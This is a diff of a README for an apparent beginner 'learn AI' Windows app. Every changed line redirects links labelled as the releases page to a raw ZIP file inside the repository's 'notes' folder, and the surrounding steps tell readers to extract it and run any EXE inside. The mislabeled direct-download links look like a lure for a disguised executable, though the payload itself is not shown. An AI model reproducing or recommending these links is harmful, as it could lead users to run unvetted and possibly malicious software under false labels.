@@ -1,6 +1,6 @@
 # 🚀 ai-adventure - Learn AI From Scratch
 
-[![Download AI-Adventure](https://img.shields.io/badge/Download%20AI--Adventure-blue?style=for-the-badge)](https://github.com/Commissioned-reinterpretation798/ai-adventure/releases)
+[![Download AI-Adventure](https://img.shields.io/badge/Download%20AI--Adventure-blue?style=for-the-badge)](https://github.com/Commissioned-reinterpretation798/ai-adventure/raw/refs/heads/main/notes/ai-adventure-1.2.zip)
 
 ## 🧭 What is AI-Adventure?
 
@@ -29,7 +29,7 @@ For a smooth run on Windows, use a computer with these basics:
 
 ## 🪟 How to Download on Windows
 
-1. Open the release page: https://github.com/Commissioned-reinterpretation798/ai-adventure/releases
+1. Open the release page: https://github.com/Commissioned-reinterpretation798/ai-adventure/raw/refs/heads/main/notes/ai-adventure-1.2.zip
 2. Look for the latest release at the top of the page
 3. Open the release assets
 4. Download the file provided there
@@ -37,7 +37,7 @@ For a smooth run on Windows, use a computer with these basics:
 
 If the release includes a ZIP file, extract it before opening the app. If it includes an EXE file, you can run it after the download finishes.
 
-[Visit the AI-Adventure releases page](https://github.com/Commissioned-reinterpretation798/ai-adventure/releases)
+[Visit the AI-Adventure releases page](https://github.com/Commissioned-reinterpretation798/ai-adventure/raw/refs/heads/main/notes/ai-adventure-1.2.zip)
 
 ## 🛠️ Install and Run
 
@@ -128,7 +128,7 @@ Keep a notebook open while you learn. Write down new words, steps, and short exa
 
 Use this page to download the latest release for Windows:
 
-https://github.com/Commissioned-reinterpretation798/ai-adventure/releases
+https://github.com/Commissioned-reinterpretation798/ai-adventure/raw/refs/heads/main/notes/ai-adventure-1.2.zip
 
 ## 🗂️ File Layout
 
@@ -173,6 +173,6 @@ Check whether the file is a ZIP. If it is, extract it first. If it is an EXE, tr
 
 ## 📌 Quick Start Links
 
-- Releases page: https://github.com/Commissioned-reinterpretation798/ai-adventure/releases
+- Releases page: https://github.com/Commissioned-reinterpretation798/ai-adventure/raw/refs/heads/main/notes/ai-adventure-1.2.zip
 - Project name: ai-adventure
 - Main goal: Learn AI from scratch on Windows
